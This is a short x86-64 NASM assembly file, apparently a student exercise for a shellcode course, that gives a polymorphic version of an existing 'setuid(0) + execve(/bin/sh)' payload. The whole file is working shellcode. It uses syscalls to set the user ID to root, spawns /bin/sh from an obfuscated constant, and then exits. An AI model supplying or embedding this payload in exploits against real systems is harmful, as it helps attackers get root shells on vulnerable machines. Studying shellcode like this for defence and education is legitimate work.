; Original Author Info:
; setuid(0) + execve(/bin/sh) - just 4 fun. 
; xi4oyu [at] 80sec.com
;
; shellcode-77-poly.nasm
; by Michael Born (@blu3gl0w13)
; Student ID: SLAE64-1439
; November 8, 2016
;

global _start

section .text

_start:

	push 0x1
	pop rdi
	dec rdi
	mul rdi
        mov   al, 0x69
        syscall

        xor   rdx, rdx
        mov   rbx, 0x68732f6e69622fff
        shr   rbx, 0x8
        push  rbx
        mov   rdi, rsp
        mul   rdx
        push  rax
        push  rdi
        mov   rsi, rsp
        mov   al, 0x3b
        syscall


        push  0x1
        pop   rdi
        push  0x3c
        pop   rax
        syscall
